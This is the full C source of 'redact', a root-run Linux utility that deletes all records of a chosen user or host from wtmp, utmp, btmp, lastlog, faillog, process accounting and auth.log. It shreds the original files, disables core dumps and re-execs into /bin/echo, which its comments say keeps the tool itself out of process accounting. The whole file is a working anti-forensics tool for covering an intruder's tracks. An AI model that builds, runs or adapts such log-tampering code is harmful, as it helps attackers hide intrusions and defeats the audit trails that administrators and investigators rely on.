/*****************************************************************************
 * Copyright 2019 Bryan Hawkins <spcnvdrr@protonmail.com>                    *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 *                                                                           *
 * 1. Redistributions of source code must retain the above copyright notice, *
 * this list of conditions and the following disclaimer.                     *
 *                                                                           *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 * notice, this list of conditions and the following disclaimer in the       *
 * documentation and/or other materials provided with the distribution.      *
 *                                                                           *
 * 3. Neither the name of the copyright holder nor the names of its          *
 * contributors may be used to endorse or promote products derived from      *
 * this software without specific prior written permission.                  *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS       *
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT         *
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR     *
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT      *
 * HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,    *
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED  *
 * TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR    *
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF    *
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING      *
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS        *
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.              *
 *                                                                           *
 * A simple program to wipe log files of all entries matching specific       *
 * criteria, e.g. username or host. This program constructs a new log        *
 * file which completely omits the matching log entries. The new, modified   *
 * log file is then copied over the original log file. It should go without  *
 * saying, but since this program modifies log files, it must be run as root *
 *****************************************************************************/
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <lastlog.h>		/* lastlog may be defined here on some systems */
#include <pwd.h>
#include <utmp.h>
#include <sys/acct.h>
#include <time.h>
#include <sys/time.h>
#include <sys/resource.h>
#include "tty_list.h"

/* The version of this program using semantic versioning format */
static char *version = "redact 0.9.2";

/* The locations of various log files on the system. Change these to
 * match the locations of log files on your system */
#define WTMPFILE 		"/var/log/wtmp"
#define UTMPFILE 		"/var/run/utmp"
#define BTMPFILE		"/var/log/btmp"
#define LASTLOGFILE		"/var/log/lastlog"
#define FAILLOGFILE		"/var/log/faillog"
#define ACCTFILE		"/var/log/account/pacct"
#define AUTHFILE		"/var/log/auth.log"

/* The longest line to read from a file */
#define MAXLINE	        4096
#define FILE_MODE       (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)
#define BUFF_SIZE       (128*1024)
#define DAY_SECONDS     86400

/* Global option for verbose mode and -d DAYS mode */
int verboseMode = 0;
int daysMode = 0;

/* Holds the time that log entries are compared against
 * when we are removing only entries created in the last N days */
time_t since;

/*
 * The login failure file is maintained by login(1) and faillog(8)
 * Each record in the file represents a separate UID and the file
 * is indexed in that fashion. Taken from the shadow source code.
 */
struct faillog{
    short fail_cnt;         /* failures since last success */
    short fail_max;         /* failures before turning account off */
    char fail_line[12];     /* last failure occurred here */
    time_t fail_time;       /* last failure occurred then */
    /*
     * If nonzero, the account will be re-enabled if there are no
     * failures for fail_locktime seconds since last failure.
     */
    long fail_locktime;
};

/** Print a help message explaining the options and arguments
 *
 */
static void usage(void){
    fprintf(stderr, "Usage: redact [-abfhlptuvVw] [-d DAYS] [-i HOST]...USERNAME\n");
    fprintf(stderr, "Wipe USERNAME from the system logs.\n\n");
    fprintf(stderr, "   -a                Wipe all available log files\n");
    fprintf(stderr, "   -b                Wipe the btmp log file\n");
    fprintf(stderr, "   -d DAYS           Only wipe entries created in the last N days\n");
    fprintf(stderr, "   -f                Wipe the faillog log file\n");
    fprintf(stderr, "   -h, -?            Display this help and exit\n");
    fprintf(stderr, "   -i HOST           Remove entries containing this hostname\n");
    fprintf(stderr, "   -k                Keep/backup original log files\n");
    fprintf(stderr, "   -l                Wipe the lastlog log file\n");
    fprintf(stderr, "   -p                Wipe process accounting logs\n");
    fprintf(stderr, "   -t                Wipe auth.log log file\n");
    fprintf(stderr, "   -u                Wipe the utmp log file\n");
    fprintf(stderr, "   -v                Enable verbose output\n");
    fprintf(stderr, "   -V                Print program version\n");
    fprintf(stderr, "   -w                Wipe the wtmp log file\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Report bugs to <spcnvdrr@protonmail.com>.\n");

    exit(EXIT_FAILURE);
}

/** Assign the uid, gid, and mode bits of src to dst
 * @param src The file with properties to assign to dst
 * @param dst The file to change the properties of
 * @returns 0 on success, else -1 on error
 *
 */
static int clone_attrs(const char *src, const char *dst){
	struct stat sbuf;

	/* Get the properties of src */
	if((stat(src, &sbuf)) < 0){
		perror("stat() error");
		return(-1);
	}

	/* Change dst's permissions and owner to that of src's */
	if((chmod(dst, sbuf.st_mode)) < 0){
		perror("chmod() error");
		return(-1);
	}

	if((chown(dst, sbuf.st_uid, sbuf.st_gid)) < 0){
		perror("chown() error");
		return(-1);
	}

	return(0);
}


/** Securely delete the specified file from disk
 * @param filename The path of the file to shred
 * @returns 0 on success, -1 on error
 * @note This function will delete/unlink the file
 * even if it failed to overwrite the contents or
 * truncate the file.
 */
static int shred(const char *filename){
	int fd;
	ssize_t i;
	int ret = 0;
	char buf[4096];
	struct stat sbuf;

	if(stat(filename, &sbuf) < 0){
		perror("stat() error");
		return(-1);
	}

	memset(buf, '\0', 4096);

	if((fd = open(filename, O_WRONLY)) < 0){
		perror("open() error");
		ret = -1;
	} else {
		for(i = 0; i < sbuf.st_size; i += 4096){
			if(write(fd, buf, 4096) != 4096){
				perror("write() error");
				close(fd);
				return(-1);
			}
		}
		close(fd);
	}

	if(truncate(filename, 0) < 0){
		perror("truncate error");
		ret = -1;
	}

	if(unlink(filename) < 0){
		perror("unlink() error");
		return(-1);
	}

	return(ret);
}


/** Move file from from to to
 * @param from The path of the file to move
 * @param to The path to rename the file to
 * @returns 0 on success, -1 on error
 * @note src is permanently deleted.
 *
 */
static int move_file(const char *from, const char *to){

	/* Change from's owner and permissions to match to's */
	if(clone_attrs(to, from) < 0){
		return(-1);
	}

	/* Securely delete the file to be replaced */
	if(shred(to) < 0){
		fprintf(stderr, "Error securely deleting file: %s\n", to);
		return(-1);
	}

	if(rename(from, to) < 0){
		perror("rename() error");
		return(-1);
	}

	return(0);
}


/** Get the the directory component of a pathname
 * @param pathname The path to get the directory of
 * @returns A pointer to the modified pathname, returns '.' if
 * a '/' is not found in pathname
 * @note This function modifies the pathname string!
 *
 */
static char *get_dir(char *pathname){
	char *n = strrchr(pathname, '/');

	if(n == NULL){
		pathname[0] = '.';
		pathname[1] = '\0';
		return(pathname);
	}

	/* Split the string into just the directory portion
	 * of pathname */
	*n = '\0';

	return(pathname);
}


/** Look up the user ID of username
 * @param username The user to find the UID of
 * @param id The variable to store the user-id in
 * @returns 0 on success, -1 on error
 * We store the UID in a passed argument because it can be
 * tricky differentiating between an error code and a valid UID
 *
 */
static int get_userid(const char *username, uid_t *id){
	struct passwd *pd;
	errno = 0;

	if((pd = getpwnam(username)) == NULL){
		/* errno is set only when an error occurs, if it
		 * is still 0, the username simply was not found */
		if(errno != 0){
			perror("getpwnam() error");
			return(-1);
		}

		fprintf(stderr, "getpwnam() error: failed to find the user ID for: %s\n",
				username);
		return(-1);
	}

	/* Return the found user ID */
	*id = pd->pw_uid;
	return(0);
}


/** Generate a temporary filename in the same directory as logfile
 * @param logfile A path to a file in the target directory
 * @returns An absolute path for a temporary file or NULL on error
 * @note It is the caller's responsibility to free the temporary path
 * when done.
 *
 */
static char *gen_tmpath(const char *logfile){
	char *ptr, *tmpath;

	if((ptr = strdup(logfile)) == NULL){
		perror("strdup() error");
		return(NULL);
	}

	if((tmpath = malloc(MAXLINE)) == NULL){
		perror("malloc() error");
		free(ptr);
		return(NULL);
	}

	get_dir(ptr);

	if(snprintf(tmpath, MAXLINE, "%s/.x%ld", ptr, random()&0x00ffffff) > 4096){
		fprintf(stderr, "snprintf() error: path was truncated\n");
		free(ptr);
		free(tmpath);
		return(NULL);
	}

	free(ptr);
	return(tmpath);
}


/** Exit the program without leaving the original program's
 * name in the process accounting logs. This is done by
 * executing another program with execl which replaces the
 * current process in memory with a different program
 * (in this case the echo program).
 * @param message a string to be printed out by echo
 * @returns On success this function does not return,
 * else -1 on error
 */
static int bail(const char *message){
	execl("/bin/echo", "echo", message, NULL);
	perror("execl() error");
	return(-1);
}


/** Copy file infile to outfile
 * @param infile The path to the file to make a copy of
 * @param outfile Where to put the copy of infile
 * @returns 0 on success, else -1 on error
 *
 */
static int copy_file(const char *infile, const char *outfile){
	int infd, outfd;
	ssize_t n;
	char *buf = NULL;

	if((infd = open(infile, O_RDONLY)) < 0){
		fprintf(stderr, "failed to open %s: %s\n", infile, strerror(errno));
		return(-1);
	}

	posix_fadvise(infd, 0, 0, POSIX_FADV_SEQUENTIAL);

	if((outfd = open(outfile, O_CREAT | O_WRONLY | O_TRUNC, FILE_MODE)) < 0){
		close(infd);
		fprintf(stderr, "failed to create/open %s: %s\n", outfile,
				strerror(errno));
		return(-1);
	}

	if((buf = malloc(BUFF_SIZE * sizeof(char))) == NULL){
		perror("malloc error");
		goto fail;
	}

	while((n = read(infd, buf, BUFF_SIZE)) > 0){
		if(write(outfd, buf, (size_t)n) != n){
			perror("write() error");
			goto fail;
		}
	}
	if(n < 0){
		perror("read() error");
		goto fail;
	}

	free(buf);
	close(outfd);
	close(infd);
	return(0);

fail:
	free(buf);
	close(outfd);
	close(infd);
	return(-1);
}


/** A dumb function to back up the selected log files
 * Each parameter represents a possible log file to back up and
 * if the parameter is set to 1 that log file is backed up to the
 * current directory.
 *
 */
static void backup_files(int wtmp, int utmp, int btmp, int lastlog,
		int faillog, int acct, int auth){

	if(wtmp){
		if(copy_file(WTMPFILE, "./wtmp.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(utmp){
		if(copy_file(UTMPFILE, "./utmp.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(btmp){
		if(copy_file(BTMPFILE, "./btmp.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(lastlog){
		if(copy_file(LASTLOGFILE, "./lastlog.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(faillog){
		if(copy_file(FAILLOGFILE, "./faillog.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(acct){
		if(copy_file(ACCTFILE, "./pacct.back") < 0)
			exit(EXIT_FAILURE);
	}

	if(auth){
		if(copy_file(AUTHFILE, "./auth.log.back") < 0)
			exit(EXIT_FAILURE);
	}
}


/** Extract the date from an auth.log entry and convert to a time_t
 * @param str The auth.log entry to parse
 * @param local A tm structure containing the last time the log was modified
 * @returns The time the log entry was made as a time_t or -1 on error
 * Note: Since auth.log entries don't contain the year,
 * we use the tm structure of the log file's last modification date
 * to determine the year.
 * Below is an example format the entry must be in:
 * "Apr 28 14:28:09 host pkexec:....."
 * The first 15 characters MUST be the date and in that format.
 *
 */
static time_t extract_time(const char *str, const struct tm *local){
	struct tm tm = {0};
	char buf[20];
	time_t date;

	memcpy(buf, str, 15);
	buf[16] = '\0';

	strptime(buf, "%b %d %H:%M:%S", &tm);
	tm.tm_year = local->tm_year;
	tm.tm_isdst = local->tm_isdst;

	if((date = mktime(&tm)) < 0){
		perror("mktime() error");
		return(-1);
	}

	return(date);
}


/** Remove all entries containing username from a log file
 * that uses utmp data structures, e.g. wtmp, utmp, etc.
 * @param username The username to search entries for
 * @param host Wipe all entries containing host instead of username
 * @param logfile The path of the utmp/wtmp/btmp file to wipe
 *
 */
static void wipe_utmp(const char *username, const char *host, const char *logfile){
	FILE *fin, *fout;
	size_t num = 0;
	size_t found = 0;
	struct utmp ut;
	size_t utsize = sizeof(struct utmp);
	char *tmpfile;
	struct tty_list *head = NULL;
	struct tty_list *tmpnode = NULL;

	/* Flag to wipe next LOGIN_PROCESS entry */
	int killLogin = 0;

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		return;
	}

	if((tmpfile = gen_tmpath(logfile)) == NULL){
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening temporary file %s: %s\n",
				tmpfile, strerror(errno));
		fclose(fin);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	/* Read utmp records until we hit EOF, wiping entries
	 * that contain the username or host */
	while(fread(&ut, utsize, 1, fin) == 1){
		num++;				/* total number of entries found */

		if(daysMode && ut.ut_tv.tv_sec < since){
			/* Entry is too old, don't wipe it */
			if(fwrite(&ut, utsize, 1, fout) != 1){
					perror("fwrite() error");
					fclose(fin);
					fclose(fout);
					unlink(tmpfile);		/* Delete our temporary file */
					free(tmpfile);
					exit(EXIT_FAILURE);

			}
			continue;
		}

		/* Wipe entries by host, else by username */
		if(host != NULL && strcmp(ut.ut_host, host) == 0){
			found++;
			continue;
		} else {
			if(strcmp(ut.ut_user, username) == 0){
				if(ut.ut_type == USER_PROCESS){
					/* Add to linked list and remove entry */
					create_node(&head, ut.ut_line);
				} else if(ut.ut_type == DEAD_PROCESS &&
						(tmpnode = find_tty(head,ut.ut_line)) != NULL){
					delete_tty(&head, ut.ut_line);
				}

				found++;
				continue;

			} else if(ut.ut_type == DEAD_PROCESS && ut.ut_user[0] == '\0'){
				if((tmpnode = find_tty(head, ut.ut_line)) != NULL){
					/* User logged in/out on tty, wipe entry */
					found++;
					/* Remove node from linked list */
					delete_tty(&head, ut.ut_line);
					/* Set flag so if next entry is LOGIN_PROCESS, wipe it */
					killLogin = 1;
					continue;
				}

			} else if(ut.ut_type == LOGIN_PROCESS && killLogin){
				killLogin = 0;
				found++;
				continue;

			} else if(ut.ut_type == BOOT_TIME){
				/* Empty the linked list */
				free_list(&head);

			}
		}

		/* We did not wipe the current entry, write to temp file */
		if(fwrite(&ut, utsize, 1, fout) != 1){
			perror("fwrite() error");
			fclose(fin);
			fclose(fout);
			unlink(tmpfile);		/* Delete our temporary file */
			free(tmpfile);
			exit(EXIT_FAILURE);

		}
	}

	/* If we quit reading because we hit an error and not EOF,
	 * print an error message and return */
	if(ferror(fin) && !feof(fin)){
		perror("fread() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	/* Close the files and free the linked list */
	fclose(fin);
	fclose(fout);
	free_list(&head);

	/* Finally, delete the old log file, and replace it with
	 * the newly modified one */
	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(verboseMode)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	return;
}

/** Wipe the lastlog file of entries containing host or username
 * @param username The username to wipe
 * @param host Wipe all entries containing host instead of username
 * @param logfile The path of the lastlog log file to wipe
 *
 */
static void wipe_last(const char *username, const char *host, const char *logfile){
	FILE *fin;
	uid_t userid;
	size_t num = 0;
	size_t found = 0;
	struct lastlog llbuf = {0};
	size_t llsize = sizeof(struct lastlog);

	/* Get username's user ID */
	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	/* Open the lastlog log file */
	if((fin = fopen(logfile, "r+")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		return;
	}

	if(host != NULL){
		while(fread(&llbuf, llsize, 1, fin) == 1){
			num++;

			/* Skip entry if it is too old */
			if(daysMode && llbuf.ll_time < since)
				continue;

			if(strcmp(llbuf.ll_host, host) == 0){
				found++;
				/* Rewind the cursor, then wipe the entry */
				fseek(fin, (long)-llsize, SEEK_CUR);
				memset(&llbuf, 0, llsize);
				fwrite(&llbuf, llsize, 1, fin);
			}
		}

		if(ferror(fin) && !feof(fin)){
			perror("fread() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		if(verboseMode)
			printf("Redacted %zu out of %zu records in %s\n",
				found, --num, logfile);

	} else {
		/* The lastlog file is indexed by user ID, so find the entry
		 * just before the one we want to wipe. */
		if(fseek(fin, (long)llsize * ((long)userid), SEEK_SET) < 0){
			perror("fseek() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		if(daysMode){
			if(fread(&llbuf, llsize, 1, fin) != 1){
				perror("fread() error");
				fclose(fin);
				return;
			}

			if(llbuf.ll_time < since){
				/* Found record is too old to wipe */
				if(verboseMode)
					printf("Redacted 0 records in %s\n", logfile);
				fclose(fin);
				return;
			} else {
				/* Entry is recent enough, rewind file pointer to wipe it */
				fseek(fin, (long)-llsize, SEEK_CUR);
			}
		}

		/* Empty the structure, which is the default for a user who
		 * has never logged in. Then overwrite username's lastlog entry */
		memset(&llbuf, 0, llsize);
		if(fwrite(&llbuf, llsize, 1, fin) != 1){
			perror("fwrite() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}

		if(verboseMode)
			printf("Redacted 1 record in %s\n", logfile);
	}

	fclose(fin);
	return;
}

/** Wipe username from the failed login log file
 * @param username The username to wipe from the log file
 * @param logfile The path of the faillog log file to wipe
 *
 */
static void wipe_fail(const char *username, const char *logfile){
	FILE *fin;
	uid_t userid;
	struct faillog fbuf = {0};
	size_t flsize = sizeof(struct faillog);

	if((fin = fopen(logfile, "r+")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		return;
	}

	/* Note that faillog does not record what host the failed login
	 * occurred from so it is not possible to wipe entries created
	 * from a certain host like the lastlog file */

	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	if(fseek(fin, (long)flsize * ((long)userid), SEEK_SET) < 0){
		perror("fseek() error");
		fclose(fin);
		exit(EXIT_FAILURE);

	}

	/* If we are wiping entries created within the last N days */
	if(daysMode){
		if(fread(&fbuf, flsize,  1, fin) != 1){
			perror("fread() error");
			fclose(fin);
			exit(EXIT_FAILURE);
		}
		if(fbuf.fail_time < since){
			if(verboseMode)
				printf("Redacted 0 records in %s\n", logfile);
			fclose(fin);
			return;
		} else {
			/* Entry is recent enough, wipe it */
			fseek(fin, (long)-flsize, SEEK_CUR);
		}
	}

	/* Write an empty log entry */
	memset(&fbuf, 0, flsize);

	if(fwrite(&fbuf, flsize, 1, fin) != 1){
		perror("fwrite() error");
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	fclose(fin);

	if(verboseMode)
		printf("Redacted 1 record in %s\n", logfile);

	return;
}

/** Wipe the process accounting log file
 *  @param username The username to wipe from the logs
 *  @param logfile Path of the process accounting log file
 *
 */
static void wipe_acct(const char *username, const char *logfile){
	uid_t userid;
	size_t num = 0;
	size_t found = 0;
	FILE *fin, *fout;
	char *tmpfile;
	struct acct_v3 acbuf;
	size_t acsize = sizeof(struct acct_v3);

	if(get_userid(username, &userid) < 0){
		exit(EXIT_FAILURE);
	}

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
				strerror(errno));
		return;
	}

	/* Generate a temporary file name */
	if((tmpfile = gen_tmpath(logfile)) == NULL){
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening %s temporary file: %s\n", tmpfile,
				strerror(errno));
		free(tmpfile);
		fclose(fin);
		exit(EXIT_FAILURE);
	}

	while(fread(&acbuf, acsize, 1, fin) == 1){
		num++;

		if(daysMode && acbuf.ac_btime < since){
			/* entry is too old, do not wipe it */
			if(fwrite(&acbuf, acsize, 1, fout) != 1){
				perror("fwrite() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
			continue;
		}

		if(acbuf.ac_uid == userid){
			found++;
			continue;
		} else{
			if(fwrite(&acbuf, acsize, 1, fout) != 1){
				perror("fwrite() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
		}
	}

	/* Make sure loop exited because of EOF and not error */
	if(ferror(fin) && !feof(fin)){
		perror("fread() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	fclose(fin);
	fclose(fout);

	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(verboseMode)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	/* Prevent redact from showing up in process logs */
	bail("");
	return;
}


/** Wipe the auth.log file that records user authentication attempts
 * @param username The username to wipe from the file
 * @param logfile The path of the auth.log file to wipe
 * TODO: Make a wipe by host option for auth.log?
 */
static void wipe_auth(const char *username, const char *logfile){
	FILE *fin, *fout;
	uid_t userid;
	char buf[MAXLINE];
	char idstr[50];
	char *tmpfile;
	size_t num = 0;
	size_t found = 0;
	struct stat sbuf;
	struct tm *lastmod;
	time_t entime;

	/* Get the last modification time and convert to a
	 * tm struct for extract_time() */
	if(stat(logfile, &sbuf) < 0){
		perror("stat() error");
		exit(EXIT_FAILURE);
	}

	if((lastmod = localtime(&sbuf.st_mtime)) == NULL){
		perror("localtime() error");
		exit(EXIT_FAILURE);
	}

	/* Get the user ID of username */
	if(get_userid(username, &userid) < 0)
		exit(EXIT_FAILURE);

	/* Convert user ID into a string */
	snprintf(idstr, 50, "%u", userid);

	if((fin = fopen(logfile, "r")) == NULL){
		fprintf(stderr, "error opening %s log file: %s\n", logfile,
						strerror(errno));
		return;
	}

	/* Generate temporary file name */
	if((tmpfile = gen_tmpath(logfile)) == NULL){
		exit(EXIT_FAILURE);
	}

	if((fout = fopen(tmpfile, "w")) == NULL){
		fprintf(stderr, "error opening %s temporary file: %s\n", tmpfile,
						strerror(errno));
		fclose(fin);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	while(fgets(buf, MAXLINE, fin) != NULL){
		num++;
		if(strstr(buf, username) != NULL || strstr(buf, idstr) != NULL){

			if(daysMode){
				if((entime = extract_time(buf, lastmod)) < 0){
					fclose(fin);
					fclose(fout);
					unlink(tmpfile);
					free(tmpfile);
					return;
				}

				if(entime < since){
					/* entry is too old, don't wipe */
					fputs(buf, fout);
					continue;
				}
			}

			found++;
			continue;
		} else {
			if(fputs(buf, fout) == EOF){
				perror("fputs() error");
				fclose(fin);
				fclose(fout);
				unlink(tmpfile);
				free(tmpfile);
				exit(EXIT_FAILURE);
			}
		}
	}

	if(ferror(fin) && !feof(fin)){
		perror("fgets() error");
		fclose(fin);
		fclose(fout);
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	fclose(fin);
	fclose(fout);

	if(move_file(tmpfile, logfile) < 0){
		unlink(tmpfile);
		free(tmpfile);
		exit(EXIT_FAILURE);
	}

	free(tmpfile);

	if(verboseMode)
		printf("Redacted %zu out of %zu records in %s\n", found, num, logfile);

	return;
}

/**
 * Usage: redact [-abfhlptuvVw] [-d days] [-i host]... USERNAME
 * Wipe USERNAME from the system logs.
 * Use -a to wipe all the log files redact knows about or
 * specify the log files individually by using the other options.
 *
 *
 */
int main(int argc, char *argv[]){
	int acctlog = 0, utmplog = 0, wtmplog = 0, btmplog = 0;
	int lastlog = 0, faillog = 0, authlog = 0, backup = 0, opt;
	int numdays;
	char *host = NULL, *username = NULL;
	struct rlimit rl;
	uid_t eid;

	/* Make sure if we shit the bed we don't leave a core file behind */
	rl.rlim_cur = 0;
	rl.rlim_max = 0;
	if(setrlimit(RLIMIT_CORE, &rl) < 0)
		perror("rlimit() error");

	/* Seed the random number generator */
	srandom(time(NULL));

	/* Process the command line options */
	while((opt = getopt(argc, argv, "abd:fi:hk?lptuvVw")) != -1){
		switch(opt){
		case 'a':
			/* Modify all available logs */
			acctlog = utmplog = wtmplog = btmplog = lastlog = 1;
			faillog = authlog = 1;
			break;

		case 'b':
			/* Wipe btmp log file */
			btmplog = 1;
			break;

		case 'd':
			/* Only remove entries created in the last N days */
			daysMode = 1;
			numdays = atoi(optarg);
			if(numdays <= 0 || numdays >= 1001){
				fprintf(stderr, "Error: invalid number of days (1 - 1000)\n");
				usage();
			}

			/* Get the current time since Epoch */
			if((since = time(NULL)) < 0){
				perror("time() error");
				exit(EXIT_FAILURE);
			}

			/* Calculate the time to compare log entries to */
			since -= (numdays * DAY_SECONDS);
			break;

		case 'f':
			/* Wipe faillog */
			faillog = 1;
			break;

		case 'i':
			/* Remove activity from this host */
			host = optarg;
			break;

		case 'k':
			/* Back up original log files to current directory */
			backup = 1;
			break;

		case 'l':
			/* Wipe lastlog file */
			lastlog = 1;
			break;

		case 'p':
			/* Wipe process accounting logs */
			acctlog = 1;
			break;

		case 'v':
			/* Enable verbose mode */
			verboseMode = 1;
			break;

		case 'V':
			/* Print program version and exit */
			puts(version);
			exit(EXIT_SUCCESS);
			break;

		case 'u':
			/* Modify utmp log file */
			utmplog = 1;
			break;

		case 't':
			/* Wipe the auth.log log file */
			authlog = 1;
			break;

		case 'w':
			/* Modify wtmp log file*/
			wtmplog = 1;
			break;

		case '?':
			/* Fall through */
		case 'h':
			usage();
			break;

		default:
			usage();
			break;
		}
	}

	/* Get the argument required by this program */
	username = argv[optind];
	if(username == NULL){
		fprintf(stderr, "Error: Must provide a user name\n");
		usage();
	}

	/* Check effective UID to make sure we are being run as root,
	 * otherwise we will just fail later. Besides, most log files
	 * can't be modified unless your root anyways.
	 */
	if((eid = geteuid()) != 0){
		fprintf(stderr, "Error: must be run as root!\n");
		return(1);
	}


	/* If back up mode is enabled, back up each selected log file
	 * to the current directory. */
	if(backup)
		backup_files(wtmplog, utmplog, btmplog, lastlog, faillog,
				acctlog, authlog);

	/* Check each flag individually so that any combination of log files
	 * can be specified on the command line */
	if(utmplog){
		wipe_utmp(username, host, UTMPFILE);
	}

	if(wtmplog){
		wipe_utmp(username, host, WTMPFILE);
	}
	if(btmplog){
		wipe_utmp(username, host, BTMPFILE);
	}
	if(lastlog){
		wipe_last(username, host, LASTLOGFILE);
	}
	if(faillog){
		wipe_fail(username, FAILLOGFILE);
	}
	if(authlog){
		wipe_auth(username, AUTHFILE);
	}
	if(acctlog){
		wipe_acct(username, ACCTFILE);
	}

	return(0);
}
